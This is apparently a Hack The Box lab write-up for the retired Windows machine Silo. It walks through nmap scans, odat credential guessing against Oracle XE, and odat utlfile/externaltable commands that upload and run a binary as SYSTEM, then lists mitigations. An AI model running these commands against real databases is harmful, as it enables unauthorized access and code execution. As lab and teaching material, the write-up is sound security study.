---
machine: Silo
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, oracle, odat, utlfile, system]
---

# Silo — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Oracle Database 11g XE listens on 1521. `odat` enumerates the `XE` SID, guesses default credentials and uses `utlfile`/`externaltable` to execute commands. The Oracle service runs as SYSTEM, so escalation is immediate.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80,135,139,445,1521 <IP>
```

- IIS, RPC, SMB and Oracle TNS 11.2.0.2.0.
- The Oracle banner is the starting point.

## Enumeration

```bash
odat sidguesser -s <IP> -p 1521
odat passwordguesser -s <IP> -p 1521 -d XE --accounts-file accounts.txt
```

`XE` is the default Express Edition SID. The classic sample credentials allow authentication.

## Foothold

```bash
odat utlfile -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --putFile C:\\ temp cmd.exe
odat externaltable -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --exec C:\\ temp cmd.exe
```

The database runs the binary through the Oracle service, which runs as `NT AUTHORITY\SYSTEM` on Windows.

## Lateral movement

No pivot is needed. Confirm the context and collect the flags.

## Privilege escalation

The service is already SYSTEM. If an interactive shell is needed, upload a reverse-shell executable and launch it through `externaltable`.

```bash
whoami
hostname
```

## Evidence

- `odat sidguesser` returning `XE`.
- Valid login with redacted credentials.
- `whoami` as SYSTEM.
- Binary transfer and execution.

## Lessons learned

- An exposed database can mean code execution.
- Default SIDs and credentials still exist.
- The service privilege defines the impact.

## Mitigations and detection

- Do not expose 1521 to untrusted networks.
- Change default credentials and disable sample accounts.
- Run Oracle under a low-privilege service account.
- Alert on `utlfile`, `externaltable` and TNS connections from uninventoried hosts.

## References

- <https://www.hackthebox.com/machines/Silo>
- <https://0xdf.gitlab.io/2018/08/04/htb-silo.html>
- <https://github.com/quentinhardy/odat>
- <https://attack.mitre.org/techniques/T1190/>
